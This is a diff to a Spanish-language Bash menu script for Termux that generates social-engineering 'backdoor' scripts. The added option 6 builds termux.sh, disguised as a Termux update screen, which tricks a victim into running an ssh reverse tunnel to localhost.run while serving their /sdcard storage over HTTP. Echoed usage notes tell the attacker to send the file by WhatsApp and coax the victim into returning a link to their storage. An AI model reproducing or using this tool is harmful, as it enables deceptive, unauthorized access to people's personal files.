@@ -56,6 +56,7 @@ echo -e "\e[1;32m|\e[0m \e[1;35m  [2].\e[0m\e[1;36m PASE ELITE\e[0m     \e[1;32m
 echo -e "\e[1;32m|\e[0m \e[1;35m  [3].\e[0m\e[1;36m FACEBOOK\e[0m       \e[1;32m|\e[0m"
 echo -e "\e[1;32m|\e[0m \e[1;35m  [4].\e[0m\e[1;36m INSTAGRAN\e[0m      \e[1;32m|\e[0m"
 echo -e "\e[1;32m|\e[0m \e[1;35m  [5].\e[0m\e[1;36m TIKTOK\e[0m         \e[1;32m|\e[0m"
+echo -e "\e[1;32m|\e[0m \e[1;35m  [6].\e[0m\e[1;36m TERMUX\e[0m         \e[1;32m|\e[0m"
 setterm -foreground green
 echo "-------------------------"
 echo -e -n "\e[1;33m [*]\e[0m\e[1;31mOPCION\e[0m \e[1;34m>>\e[0m "
@@ -70,23 +71,6 @@ apt update -y
 #! /bin/bash
 
 setterm -foreground green
-#directory verification
-directory=$(pwd)
-
-
-if which figlet >/dev/null; then
-sleep 1
-echo ''
-echo  '(figlet) ................................................... Instalado [✓]'
-else
-sleep 1
-echo  '(figlet) No instalado [✗]'
-sleep 1
-echo  'Instalando figlet ...'
-sleep 3
-pkg install figlet
-fi
-
 #directory verification
 directory=$(pwd)
 
@@ -234,23 +218,6 @@ setterm -foreground green
 directory=$(pwd)
 
 
-if which figlet >/dev/null; then
-sleep 1
-echo ''
-echo  '(figlet) ................................................... Instalado [✓]'
-else
-sleep 1
-echo  '(figlet) No instalado [✗]'
-sleep 1
-echo  'Instalando figlet ...'
-sleep 3
-pkg install figlet
-fi
-
-#directory verification
-directory=$(pwd)
-
-
 if which python >/dev/null; then
 sleep 1
 echo ''
@@ -385,23 +352,6 @@ apt update -y
 #! /bin/bash
 
 setterm -foreground green
-#directory verification
-directory=$(pwd)
-
-
-if which figlet >/dev/null; then
-sleep 1
-echo ''
-echo  '(figlet) ................................................... Instalado [✓]'
-else
-sleep 1
-echo  '(figlet) No instalado [✗]'
-sleep 1
-echo  'Instalando figlet ...'
-sleep 3
-pkg install figlet
-fi
-
 #directory verification
 directory=$(pwd)
 
@@ -548,23 +498,6 @@ setterm -foreground green
 directory=$(pwd)
 
 
-if which figlet >/dev/null; then
-sleep 1
-echo ''
-echo  '(figlet) ................................................... Instalado [✓]'
-else
-sleep 1
-echo  '(figlet) No instalado [✗]'
-sleep 1
-echo  'Instalando figlet ...'
-sleep 3
-pkg install figlet
-fi
-
-#directory verification
-directory=$(pwd)
-
-
 if which python >/dev/null; then
 sleep 1
 echo ''
@@ -707,23 +640,6 @@ setterm -foreground green
 directory=$(pwd)
 
 
-if which figlet >/dev/null; then
-sleep 1
-echo ''
-echo  '(figlet) ................................................... Instalado [✓]'
-else
-sleep 1
-echo  '(figlet) No instalado [✗]'
-sleep 1
-echo  'Instalando figlet ...'
-sleep 3
-pkg install figlet
-fi
-
-#directory verification
-directory=$(pwd)
-
-
 if which python >/dev/null; then
 sleep 1
 echo ''
@@ -818,6 +734,7 @@ echo 'ssh -R 80:localhost:5447 nokey@localhost.run -q > /sdcard/code.zip'
 echo ''
 termux-setup-storage 
 cd /sdcard
+
 python -m http.server 5447
 #
 " >> tiktok.sh
@@ -834,7 +751,7 @@ echo 'pedimos que lo instale en su cell , ya una vez esto le decimos'
 echo ''
 echo 'si es que ya tiene termux entonces no le decimos eso'
 echo ''
-echo 'Bueno una ves esto le enviamos el backdoor pase.sh por su wasap'
+echo 'Bueno una ves esto le enviamos el backdoor tiktok.sh por su wasap'
 echo ''
 echo 'Le pedimos que lo abra con su termux , y listo le pediremos que lo ejecute'
 echo ''
@@ -854,6 +771,147 @@ echo 'ese archivo, adentro de ese archivo esta el link con el que podemos ingres
 #
 exit
 ;;
+6)
+echo "
+apt update -y
+
+#! /bin/bash
+
+setterm -foreground green
+#directory verification
+directory=$(pwd)
+
+
+if which python >/dev/null; then
+sleep 1
+echo ''
+echo  '(python) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(python) No instalado [✗]'
+sleep 1
+echo 'Instalando python ...'
+sleep 3
+pkg install python -y
+fi
+
+
+#directory verification
+directory=$(pwd)
+
+
+if which dropbear >/dev/null; then
+sleep 1
+echo ''
+echo  '(dropbear) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(dropbear) No instalado [✗]'
+sleep 1
+echo 'Instalando dropbear ...'
+sleep 3
+pkg install dropbear -y
+fi
+
+setterm -foreground green
+#directory verification
+directory=$(pwd)
+
+
+if which toilet >/dev/null; then
+sleep 1
+echo ''
+echo  '(toilet) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(toilet) No instalado [✗]'
+sleep 1
+echo  'Instalando toilet ...'
+sleep 3
+pkg install toilet -y
+fi
+
+
+#directory verification
+directory=$(pwd)
+
+
+if which openssh >/dev/null; then
+sleep 1
+echo ''
+echo  '(openssh) ................................................... Instalado [✓]'
+else
+sleep 1
+echo  '(openssh) No instalado [✗]'
+sleep 1
+echo 'Instalando openssh ...'
+sleep 3
+pkg install openssh -y
+fi
+clear
+
+setterm -foreground green
+toilet -f big Termux -F border
+echo ''
+setterm -foreground red
+echo '----------------------------------------'
+echo -e '|\e[1;32;45m 🤖 🤖 🤖 [ Actualizar Termux ] 🤖 🤖 🤖\e[0m\e[1;31m|\e[0m'
+setterm -foreground red
+echo '----------------------------------------'
+echo ''
+setterm -foreground green
+echo -n '[+]Escribe tu nombre >> '
+read a
+echo ''
+echo -n '[+]Escribe la fecha de hoy >> '
+read b
+echo ''
+sleep 1
+setterm -foreground cyan
+echo 'A usted se le esta actualizando termux'
+echo ''
+echo 'Copie el siguiente codigo y pegelo en una nueva ventana y dele enter'
+echo ''
+echo 'ssh -R 80:localhost:5448 nokey@localhost.run -q > /sdcard/code.zip'
+echo ''
+termux-setup-storage 
+cd /sdcard
+
+python -m http.server 5448
+#
+" >> termux.sh
+cp termux.sh /sdcard
+setterm -foreground yellow
+echo 'Su backdoor termux.sh se guardo en su Almacenamiento Interno'
+echo 'Enviar termux.sh a la victima use Ingenieria Social'
+echo ''
+setterm -foreground green
+echo 'USO:'
+echo 'Enviar termux.sh le decimos que abra termux si no lo tiene le'
+echo ''
+echo 'pedimos que lo instale en su cell , ya una vez esto le decimos'
+echo ''
+echo 'si es que ya tiene termux entonces no le decimos eso'
+echo ''
+echo 'Bueno una ves esto le enviamos el backdoor termux.sh por su wasap'
+echo ''
+echo 'Le pedimos que lo abra con su termux , y listo le pediremos que lo ejecute'
+echo ''
+echo 'el nombre del backdoor cambia pero le pedimos que lo copie y pegue'
+echo ''
+echo 'y lo ejecute con bash el nombre del backdoor'
+echo ''
+echo 'le decimos que ingrese su nombre y la fecha de hoy'
+echo ''
+echo 'Una ves esto le va salir un codigo que comiensa con ssh y termina en .zip'
+echo ''
+echo 'le pedimos que lo copie y lo pegue en una nueva sesion y le de enter'
+echo ''
+echo 'despues de eso se le genera un archivo code.zip le pedimos que nos envie'
+echo ''
+echo 'ese archivo, adentro de ese archivo esta el link con el que podemos ingresar y listo ya tenemos acceso a su almacenamiento interno'
+#
+;;
+exit
 esac
 done
-
